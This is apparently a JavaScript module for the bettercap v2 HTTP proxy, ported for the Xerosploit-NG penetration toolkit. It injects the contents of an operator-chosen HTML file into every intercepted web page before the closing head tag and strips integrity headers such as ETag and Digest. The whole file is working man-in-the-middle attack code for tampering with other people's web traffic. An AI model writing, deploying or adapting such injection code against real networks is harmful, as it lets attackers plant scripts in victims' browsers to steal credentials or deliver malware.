// ---------------------------------------------------------------------------
// Xerosploit-NG :: bettercap v2 HTTP proxy module -- InjectHtml
//
// Injects the contents of the file referenced by the generated global
// XE_TARGET_FILE into every proxied text/html response, immediately before
// </head> (with a </body> / end-of-document fallback).
//
// Ported from the bettercap v1 Ruby proxy module:
//   lib/bettercap/proxy/http/modules/injecthtml.rb   (GPLv3)
// which did exactly `response.body.sub!('</head>') { "<data><p></p></head>" }`.
// Backs the "Inject Html" menu entry of Xerosploit.
//
// Generated parameter globals (lib/engine.py, PORT-SPEC section 6):
//   XE_TARGET_FILE  absolute path of the HTML fragment to inject.
//
// FAIL-OPEN BODY DISCIPLINE (bettercap v2): res.ReadBody() flips bettercap's
// "body modified" flag, so after the body has been read this module MUST write
// a body back or bettercap emits an EMPTY response.  The decision to rewrite
// is therefore made from method/status/headers alone; only then is the body
// read exactly once.  Every exit path after that read sets the body and a
// Content-Length equal to the UTF-8 byte length of the string it writes:
// either the injected bytes, or the byte-exact original when the rewrite throws.
// GET + status 200 + no Range/Content-Range only; RANGE/206 responses are never
// touched.  A response this module does not handle is left byte-identical.
//
// Released under the GNU GPLv3.
// Original Xerosploit: LionSec / Neodrix.
// bettercap proxy-module concepts: Simone 'evilsocket' Margaritelli (GPLv3).
// ---------------------------------------------------------------------------

var XE_MODULE_NAME = "injecthtml";

function xeLog(msg) {
    if (typeof log_info === "function") { log_info("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}
function xeWarn(msg) {
    if (typeof log_warn === "function") { log_warn("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}

// Number of UTF-8 bytes in a string (Content-Length is byte based).
function xeByteLen(s) {
    var n = 0, i, c;
    s = "" + s;
    for (i = 0; i < s.length; i++) {
        c = s.charCodeAt(i);
        if (c < 0x80) { n += 1; }
        else if (c < 0x800) { n += 2; }
        else if (c >= 0xD800 && c <= 0xDBFF) { n += 4; i += 1; }
        else { n += 3; }
    }
    return n;
}

// Case-insensitive read from a bettercap header map (req.Headers / res.Headers).
function xeGetHeader(headers, name) {
    if (!headers) { return null; }
    var want = ("" + name).toLowerCase();
    var key;
    for (key in headers) {
        if (("" + key).toLowerCase() === want) {
            var value = headers[key];
            if (value === null || value === undefined) { return null; }
            return value;
        }
    }
    return null;
}

// Decide, from method/status/headers ALONE (no body read), whether this
// response may be rewritten as a full-body 200.  Range and partial responses
// are never rewritten.
function xeSkipResponse(req, res) {
    if (!req || req.Method !== "GET") { return true; }
    if (!res || res.Status !== 200) { return true; }
    if (xeGetHeader(req.Headers, "Range")) { return true; }
    if (xeGetHeader(res.Headers, "Content-Range")) { return true; }
    return false;
}

// Headers that described the ORIGINAL entity and must not survive a body swap.
var XE_STALE_HEADERS = [
    "Content-Range", "Accept-Ranges", "ETag", "Last-Modified", "Digest",
    "Content-MD5", "Content-Disposition", "Content-Encoding", "Transfer-Encoding"
];

// Set res.Body plus a correct byte-based Content-Length.  Used for the
// fail-open write-back of the original bytes: it deliberately leaves the
// original entity headers alone because the entity did not change.
function xeWriteBody(res, body) {
    res.Body = body;
    if (typeof res.SetHeader === "function") {
        res.SetHeader("Content-Length", "" + xeByteLen(body));
    }
}

// Replace the body: drop every stale entity header, set the replacement
// Content-Type, then set res.Body + Content-Length.
function xeReplaceBody(res, body, contentType) {
    if (typeof res.RemoveHeader === "function") {
        for (var i = 0; i < XE_STALE_HEADERS.length; i++) {
            res.RemoveHeader(XE_STALE_HEADERS[i]);
        }
    }
    if (contentType && typeof res.SetHeader === "function") {
        res.SetHeader("Content-Type", contentType);
    }
    xeWriteBody(res, body);
}

function xeIsHtml(res) {
    return !!res && typeof res.ContentType === "string" &&
        res.ContentType.toLowerCase().indexOf("text/html") === 0;
}

function xeReadFile(path) {
    if (!path || typeof readFile !== "function") { return null; }
    try { return readFile(path); } catch (e) { xeWarn("cannot read " + path + ": " + e); return null; }
}

function xeReadBody(res) {
    if (!res) { return null; }
    if (typeof res.ReadBody === "function") { return res.ReadBody(); }
    return res.Body;
}

// Insert `snippet` right before </head>, else before </body>, else append.
function xeInjectBeforeCloseTag(body, snippet) {
    var lower = body.toLowerCase();
    var at = lower.indexOf("</head>");
    if (at !== -1) { return body.substring(0, at) + snippet + body.substring(at); }
    at = lower.indexOf("</body>");
    if (at !== -1) { return body.substring(0, at) + snippet + body.substring(at); }
    return body + snippet;
}

function onLoad() {
    var target = (typeof XE_TARGET_FILE === "undefined") ? null : XE_TARGET_FILE;
    xeLog("loaded (target file: " + target + ")");
}

function onResponse(req, res) {
    // Decide from headers/URL only; a skipped response is never read or mutated.
    if (!xeIsHtml(res)) { return; }
    if (xeSkipResponse(req, res)) { return; }

    var target = (typeof XE_TARGET_FILE === "undefined") ? null : XE_TARGET_FILE;
    if (!target) { xeWarn("XE_TARGET_FILE is not set; passing through"); return; }

    var payload = xeReadFile(target);
    if (payload === null || payload === "") { xeWarn("empty target file: " + target); return; }

    // Committed to rewriting: read the body exactly once and always write back.
    var original = null;
    try {
        original = xeReadBody(res);
        if (typeof original !== "string") { return; }

        var where = (req && req.Hostname ? req.Hostname : "") + (req && req.Path ? req.Path : "");
        xeLog("injecting " + target + " into " + where);

        var out = xeInjectBeforeCloseTag(original, payload);
        if (out !== original) {
            xeReplaceBody(res, out, (typeof res.ContentType === "string" && res.ContentType) ? res.ContentType : "text/html");
        } else {
            xeWriteBody(res, original);
        }
    } catch (e) {
        xeWarn("onResponse failed: " + e);
        if (typeof original === "string") {
            xeWriteBody(res, original);                                  // fail-open: exact original bytes
        }
    }
}
